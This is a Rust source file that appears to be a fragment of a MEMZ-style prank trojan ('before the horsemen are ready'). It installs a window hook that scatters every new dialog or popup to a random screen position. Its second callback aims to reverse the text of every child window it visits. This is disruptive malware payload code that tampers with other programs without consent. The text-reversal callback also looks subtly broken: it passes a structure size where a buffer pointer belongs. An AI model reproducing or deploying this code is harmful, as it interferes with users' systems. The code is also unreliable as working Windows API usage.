use std::mem::size_of_val;

use windows::{
    Win32::{
        Foundation::{BOOL, HWND, LPARAM, LRESULT, TRUE, WPARAM},
        UI::WindowsAndMessaging::{
            CallNextHookEx, SendMessageTimeoutW, CBT_CREATEWNDA, HCBT_CREATEWND, HHOOK,
            SMTO_ABORTIFHUNG, SM_CXSCREEN, SM_CYSCREEN, WINDOW_STYLE, WM_GETTEXT, WM_SETTEXT,
            WS_DLGFRAME, WS_POPUP,
        },
    },
};

use crate::{wrap_windows_api::wrap_get_system_metrics, GMEM_ZEROINIT};

/// # Safety
///
/// This function is CallBack function
/// This function should not be called before the horsemen are ready.
pub unsafe extern "system" fn msg_box_hook(ncode: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if ncode == HCBT_CREATEWND as i32 {
        let pcs = (*(lparam.0 as *mut CBT_CREATEWNDA)).lpcs;
        if (WINDOW_STYLE((*pcs).style as u32) & WS_DLGFRAME) != WINDOW_STYLE(0)
            || (WINDOW_STYLE((*pcs).style as u32) & WS_POPUP) != WINDOW_STYLE(0)
        {
            let _hwnd = HWND(wparam.0 as isize);
            let (scrw, scrh) = (
                wrap_get_system_metrics(SM_CXSCREEN).expect("Failed GetSystemMetrics"),
                wrap_get_system_metrics(SM_CYSCREEN).expect("Failed GetSystemMetrics"),
            );
            let coordinate = (
                rand::random::<i32>() % (scrw - (*pcs).cx),
                rand::random::<i32>() % (scrh - (*pcs).cy),
            );
            (*pcs).x = coordinate.0;
            (*pcs).y = coordinate.1;
        }
    }

    CallNextHookEx(HHOOK(0_isize), ncode, wparam, lparam)
}

/// # Safety
///
/// This function is CallBack function
/// This function should not be called before the horsemen are ready.
pub unsafe extern "system" fn enum_child_proc(hwnd: HWND, _lparam: LPARAM) -> BOOL {
    let mut alloc = vec![GMEM_ZEROINIT; 8192];
    if SendMessageTimeoutW(
        hwnd,
        WM_GETTEXT,
        WPARAM(8192),
        LPARAM(size_of_val(&alloc) as isize),
        SMTO_ABORTIFHUNG,
        100,
        None,
    )
    .0 != 0
    {
        alloc.reverse();
        SendMessageTimeoutW(
            hwnd,
            WM_SETTEXT,
            WPARAM::default(),
            LPARAM(size_of_val(&alloc) as isize),
            SMTO_ABORTIFHUNG,
            100,
            None,
        );
    }
    TRUE
}
